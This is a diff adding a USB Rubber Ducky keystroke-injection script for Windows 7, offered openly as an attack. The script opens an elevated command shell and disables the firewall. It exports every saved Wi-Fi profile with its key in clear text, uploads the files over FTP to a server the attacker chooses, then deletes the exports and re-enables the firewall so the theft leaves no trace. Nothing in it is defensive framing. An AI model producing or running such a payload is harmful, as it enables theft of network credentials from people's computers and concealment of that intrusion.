@@ -1,0 +1,51 @@
+REM Author: Bucky67GTO
+REM Duckencoder: 2.2
+REM Target: Windows 7
+REM Description: This script will enter the command shell as administrator, disable the firewall and export the wifi settings then send to an ftp server of your choice. the cool part is that the security is exported in clear text. After sending the file it will delete the exports from the sending directory and restore the firewall.
+
+DELAY 2000
+ESCAPE
+CONTROL ESCAPE
+DELAY 400
+STRING cmd
+DELAY 400
+CTRL-SHIFT ENTER
+DELAY 400
+STRING netsh firewall set opmode mode=disable
+ENTER
+DELAY 400
+STRING netsh wlan export profile key=clear
+ENTER
+DELAY 400
+STRING cd %USERPROFILE%
+ENTER
+DELAY 400
+STRING ftp -i ftp server
+ENTER
+DELAY 400
+STRING username
+ENTER
+DELAY 400
+STRING password
+ENTER
+DELAY 600
+STRING prompt
+ENTER
+DELAY 400
+STRING prompt
+ENTER
+DELAY 400
+STRING MPUT *.xml
+ENTER
+DELAY 4000
+STRING bye
+ENTER
+DELAY 400
+STRING del *.xml
+ENTER
+DELAY 200
+STRING netsh firewall set opmode mode=enable
+ENTER
+DELAY 400
+ALT SPACE
+STRING c
